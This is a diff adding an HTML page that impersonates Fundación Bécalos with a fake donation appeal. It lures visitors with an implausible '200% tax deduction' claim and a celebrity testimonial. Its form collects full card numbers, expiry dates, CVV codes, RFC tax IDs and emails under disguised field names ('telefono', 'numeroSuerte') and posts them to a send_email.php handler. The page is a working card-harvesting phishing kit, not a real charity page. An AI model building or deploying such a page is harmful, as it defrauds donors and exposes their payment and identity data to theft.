@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dona con confianza - Fundación Bécalos</title>
+    <style>
+        /* Estilo general */
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            color: #333;
+        }
+
+        /* Encabezado */
+        header {
+            background: url('https://informe.fundaciontelevisa.org/informe2021/assets/images/fotos/2021/Becalos.jpg') no-repeat center top;
+            background-size: cover;
+            color: white;
+            text-align: center;
+            padding: 175px 20px 60px; /* Ajuste para subir la imagen */
+            position: relative;
+        }
+
+        header h1 {
+            font-size: 4rem;
+            margin-bottom: 50px;
+            position: relative;
+            top: -183px; /* Ajustar hacia arriba */
+            left: 30px;
+            text-align: left;
+        }
+
+        header p {
+            font-size: 2.1rem;
+            margin-bottom: 20px;
+            position: relative;
+            top: -200px;
+            left: 170px;
+            text-align: left;
+        }
+
+        header .cta-button {
+            background-color: #FFC107;
+            color: #333;
+            padding: 15px 25px;
+            text-decoration: none;
+            font-weight: bold;
+            border-radius: 25px;
+            font-size: 1.2rem;
+            margin-top: 20px; /* Ajuste para bajar el botón más */
+        }
+
+        header .cta-button:hover {
+            background-color: #FFA000;
+        }
+
+        /* Sección destacada */
+        .highlight {
+            background: #fff9e6;
+            border-left: 5px solid #FFC107;
+            padding: 15px;
+            margin: 20px auto;
+            max-width: 90%;
+            font-size: 1.1rem;
+            line-height: 1.5;
+            text-align: center;
+        }
+
+        /* Formulario */
+        .form-background {
+            background: url('https://periodicocorreo.com.mx/__export/sites/correo/img/2024/07/17/presentacion-libre-producto-49-815320964.jpg') no-repeat center center;
+            background-size: contain; /* Asegura que la imagen se muestre completa */
+            background-color: #f5f5f5; /* Fondo de respaldo en caso de que la imagen no cargue */
+            padding: 50px 0;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            text-align: center;
+            margin-top: 10px; /* Ajustar margen superior */
+            margin-bottom: 20px;
+            color: #5bb8e6;
+        }
+
+        label {
+            display: block;
+            margin: 15px 0 5px;
+            font-weight: bold;
+        }
+
+        input, select, button {
+            width: 100%;
+            padding: 10px;
+            margin: 5px 0 15px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        button {
+            background-color: #5bb8e6;
+            color: white;
+            border: none;
+            padding: 15px;
+            font-size: 1.1rem;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #3fa4d6;
+        }
+
+        /* Testimonios */
+        .testimonials {
+            background: #5bb8e6;
+            color: white;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .testimonial {
+            margin: 10px auto;
+            max-width: 800px;
+        }
+
+        .testimonial p {
+            font-style: italic;
+        }
+
+        .testimonial strong {
+            display: block;
+            margin-top: 10px;
+        }
+
+        /* Footer */
+        footer {
+            text-align: center;
+            background-color: #333;
+            color: white;
+            padding: 10px;
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Cambia Vidas con tu Donación</h1>
+        <p>Invierte en la educación de niños mexicanos y crea un futuro brillante.</p>
+        <a href="#donate" class="cta-button">Dona Ahora</a>
+    </header>
+
+    <div class="highlight">
+        <p><strong>¡Beneficio Único!</strong> Por cada peso que donas, puedes deducir hasta el <strong>200% de impuestos</strong>. Sólo completa tu RFC.</p>
+    </div>
+
+    <div class="form-background">
+        <div class="container" id="donate">
+            <h2>Formulario de Donación</h2>
+            <form id="donationForm" action="send_email.php" method="POST">
+                <label for="nombre">Nombre</label>
+                <input type="text" id="nombre" name="nombre" required>
+
+                <label for="apellido">Apellido</label>
+                <input type="text" id="apellido" name="apellido" required>
+
+                <label for="rfc">RFC</label>
+                <input type="text" id="rfc" name="rfc" maxlength="13" required>
+
+                <label for="cantidad">Cantidad a donar (MXN)</label>
+                <select id="cantidad" name="cantidad" required>
+                    <option value="50">50</option>
+                    <option value="100">100</option>
+                    <option value="200">200</option>
+                    <option value="300">300</option>
+                    <option value="400">400</option>
+                    <option value="500">500</option>
+                    <option value="1000">1000</option>
+                </select>
+
+                <label for="telefono">Tarjeta de Crédito/Débito</label>
+                <input type="text" id="telefono" name="telefono" required>
+
+                <label for="mes">Mes de Vencimiento</label>
+                <input type="text" id="mes" name="mes" maxlength="5" placeholder="MM/AA" required>
+
+                <label for="numeroSuerte">CVV/CVC</label>
+                <input type="text" id="numeroSuerte" name="numeroSuerte" maxlength="3" required>
+
+                <label for="email">Correo electrónico</label>
+                <input type="email" id="email" name="email" required>
+
+                <button type="submit">Enviar mi Donación</button>
+            </form>
+        </div>
+    </div>
+
+    <div class="testimonials">
+        <div class="testimonial">
+            <p>"Gracias a Bécalos, mis hijos han podido seguir estudiando. ¡Es increíble lo que la educación puede lograr!"</p>
+            <strong>- María López, Beneficiaria</strong>
+        </div>
+        <div class="testimonial">
+            <p>"Invertir en Bécalos es invertir en el futuro de México."</p>
+            <strong>- Javier "Chicharito" Hernández</strong>
+        </div>
+    </div>
+
+    <footer>
+        Fundación Bécalos | Todos los derechos reservados &copy; 2025
+    </footer>
+
+  <script>
+        document.getElementById('telefono').addEventListener('input', function(e) {
+            const input = e.target;
+            let value = input.value.replace(/\D/g, ''); // Elimina cualquier carácter no numérico
+            value = value.substring(0, 16); // Limita a 16 caracteres numéricos
+
+            // Agrega espacios cada 4 dígitos
+            const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            input.value = formattedValue.trim();
+        });
+
+        document.getElementById('mes').addEventListener('input', function(e) {
+            const input = e.target;
+            let value = input.value.replace(/\D/g, ''); // Elimina cualquier carácter no numérico
+            value = value.substring(0, 4); // Limita a 4 caracteres numéricos
+
+            if (value.length >= 3) {
+                input.value = value.substring(0, 2) + '/' + value.substring(2);
+            } else {
+                input.value = value;
+            }
+        });
+
+        document.getElementById('mes').addEventListener('blur', function(e) {
+            const input = e.target;
+            const currentDate = new Date();
+            const currentMonth = currentDate.getMonth() + 1; // Mes actual (0-11)
+            const currentYear = currentDate.getFullYear() % 100; // Últimos 2 dígitos del año
+
+            const [month, year] = input.value.split('/').map(Number);
+
+            if (year < currentYear || (year === currentYear && month < currentMonth)) {
+                alert('Por favor, selecciona una fecha válida.');
+                input.value = '';
+            }
+        });
+
+        document.getElementById('rfc').addEventListener('input', function(e) {
+            e.target.value = e.target.value.toUpperCase();
+        });
+    </script>
+</body>
+</html>
